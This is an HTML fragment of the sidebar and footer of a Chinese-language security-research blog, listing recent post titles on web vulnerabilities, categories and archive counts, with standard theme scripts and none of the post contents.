href="/tags/"><div class="headline">标签</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/godzeo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/godzeo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:zzzhhhaaaiiii@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Weclome my blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/03/05/YApi%E5%88%86%E6%9E%90%E4%BB%8ENoSQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md/" title="YApi分析从NoSQL注入到RCE远程命令执行.md"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152157832.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="YApi分析从NoSQL注入到RCE远程命令执行.md"/></a><div class="content"><a class="title" href="/2023/03/05/YApi%E5%88%86%E6%9E%90%E4%BB%8ENoSQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md/" title="YApi分析从NoSQL注入到RCE远程命令执行.md">YApi分析从NoSQL注入到RCE远程命令执行.md</a><time datetime="2023-03-05T01:48:54.000Z" title="发表于 2023-03-05 09:48:54">2023-03-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/25/OAuth%202.0%20%E8%AE%A4%E8%AF%81%E5%92%8C%E6%94%BB%E5%87%BB%E9%9D%A2/" title="OAuth 2.0 认证和攻击面"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154568.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="OAuth 2.0 认证和攻击面"/></a><div class="content"><a class="title" href="/2023/02/25/OAuth%202.0%20%E8%AE%A4%E8%AF%81%E5%92%8C%E6%94%BB%E5%87%BB%E9%9D%A2/" title="OAuth 2.0 认证和攻击面">OAuth 2.0 认证和攻击面</a><time datetime="2023-02-25T02:22:44.000Z" title="发表于 2023-02-25 10:22:44">2023-02-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/12/ImageMagick%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2022-44268)/" title="ImageMagick任意文件读取漏洞(CVE-2022-44268)"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152157832.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ImageMagick任意文件读取漏洞(CVE-2022-44268)"/></a><div class="content"><a class="title" href="/2023/02/12/ImageMagick%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2022-44268)/" title="ImageMagick任意文件读取漏洞(CVE-2022-44268)">ImageMagick任意文件读取漏洞(CVE-2022-44268)</a><time datetime="2023-02-12T09:19:00.000Z" title="发表于 2023-02-12 17:19:00">2023-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/28/%E5%89%8D%E7%AB%AFwebsocket%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E(CSWSH)/" title="前端websocket劫持漏洞(CSWSH)"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154457.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="前端websocket劫持漏洞(CSWSH)"/></a><div class="content"><a class="title" href="/2023/01/28/%E5%89%8D%E7%AB%AFwebsocket%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E(CSWSH)/" title="前端websocket劫持漏洞(CSWSH)">前端websocket劫持漏洞(CSWSH)</a><time datetime="2023-01-28T09:00:35.000Z" title="发表于 2023-01-28 17:00:35">2023-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/02/%E5%BA%94%E6%80%A5!linux%20%E6%8C%82D%E7%9B%BE%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95/" title="应急/linux 挂D盾扫描方法"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154494.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急/linux 挂D盾扫描方法"/></a><div class="content"><a class="title" href="/2023/01/02/%E5%BA%94%E6%80%A5!linux%20%E6%8C%82D%E7%9B%BE%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95/" title="应急/linux 挂D盾扫描方法">应急/linux 挂D盾扫描方法</a><time datetime="2023-01-02T11:49:32.000Z" title="发表于 2023-01-02 19:49:32">2023-01-02</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            <a class="card-more-btn" href="/categories/" title="查看更多">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/"><span class="card-category-list-name">WEB 漏洞复现和分析</span><span class="card-category-list-count">51</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/app%E6%B8%97%E9%80%8F/"><span class="card-category-list-name">app渗透</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/spring-boot/"><span class="card-category-list-name">spring boot</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/yapi/"><span class="card-category-list-name">yapi</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"><span class="card-category-list-name">二进制安全研究</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E9%83%A8/"><span class="card-category-list-name">人工智能机器学习与安全研究部</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="card-category-list-name">代码审计</span><span class="card-category-list-count">23</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"><span class="card-category-list-name">内网安全研究</span><span class="card-category-list-count">19</span></a></li>
            </ul></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/02/"><span class="card-archive-list-date">二月 2023</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/01/"><span class="card-archive-list-date">一月 2023</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/11/"><span class="card-archive-list-date">十一月 2022</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/10/"><span class="card-archive-list-date">十月 2022</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/05/"><span class="card-archive-list-date">五月 2022</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/04/"><span class="card-archive-list-date">四月 2022</span><span class="card-archive-list-count">2</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">132</div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-03-22T00:21:17.127Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2023 By Zeo</div><div class="footer_custom_text">Hi, welcome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["Life is like a box of chocolates that you will never know what you gonna get"],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = 'Life is like a box of chocolates that you will never know what you gonna get'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div></div></body></html>